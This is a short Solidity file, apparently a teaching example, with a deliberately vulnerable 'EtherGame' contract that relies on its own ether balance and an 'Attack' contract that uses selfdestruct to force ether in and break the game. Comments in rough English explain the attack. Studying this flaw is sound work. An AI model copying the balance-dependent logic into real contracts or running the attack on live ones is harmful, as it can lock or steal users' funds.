// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// so in this game if the target becomes 7, so ether will be gone to winner
// so attack attacks the game and made 5 ethers in the contract directly and once other person deposit 1 ether, he sent 1 ether more to get to target value and becomes winner
contract EtherGame{
    uint public targetAmount=7 ether;
    address public winner;

    function deposit() public payable{
        require(msg.value==1 ether,"you can only send 1 ether");

        uint balance=address(this).balance;
        require(balance<=targetAmount,"Game is over");

        if(balance==targetAmount){
            winner=msg.sender;
        }
    }

    function claimReward() public{
        require(msg.sender==winner,"Not Winner");

        (bool sent,)=msg.sender.call{value:address(this).balance}("");
        require(sent,"Failed to sent ether");
    }

    function getBalance() public view returns (uint){
        return address(this).balance;
    }
}

contract Attack{
    function attack(address payable target) public payable{
        selfdestruct(target);
    }
}